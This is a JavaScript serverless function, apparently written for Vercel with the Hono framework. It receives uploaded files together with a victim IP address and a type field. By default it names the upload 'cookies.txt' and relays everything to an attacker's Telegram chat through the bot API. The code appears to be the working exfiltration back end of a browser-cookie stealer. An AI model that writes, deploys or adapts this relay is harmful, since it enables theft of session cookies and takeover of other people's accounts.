import { Hono } from 'hono';
// For Node.js compatibility (Vercel's Serverless Functions), import Blob and FormData from undici
import { FormData, Blob, File } from 'undici';

// Vercel sets env vars as process.env (for Serverless, not Edge)
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const app = new Hono();

app.post(async (c) => {
  // Parse the multipart form data (fields and files)
  const form = await c.req.parseBody({ all: true });
  const ip = form['ip'];
  const type = form['type'];
  const file = form['file'];

  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    return c.json({ success: false, error: 'Bot not configured' }, 500);
  }

  if (!file) {
    return c.json({ success: false, error: 'No file received' }, 400);
  }

  // Build the form for Telegram
  const tgForm = new FormData();
  tgForm.append('chat_id', TELEGRAM_CHAT_ID);
  tgForm.append('document', file, file.name || 'cookies.txt');

  // Optional: Add caption
  let caption = '';
  if (ip) caption += `IP: ${ip}\n`;
  if (type) caption += `Type: ${type}\n`;
  if (caption) tgForm.append('caption', caption);

  // Send to Telegram
  const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
    method: 'POST',
    body: tgForm
  });

  if (!tgRes.ok) {
    const errText = await tgRes.text();
    return c.json({ success: false, error: errText }, 502);
  }

  return c.json({ success: true });
});

// Required for Vercel's Serverless function export
export default app.fetch;
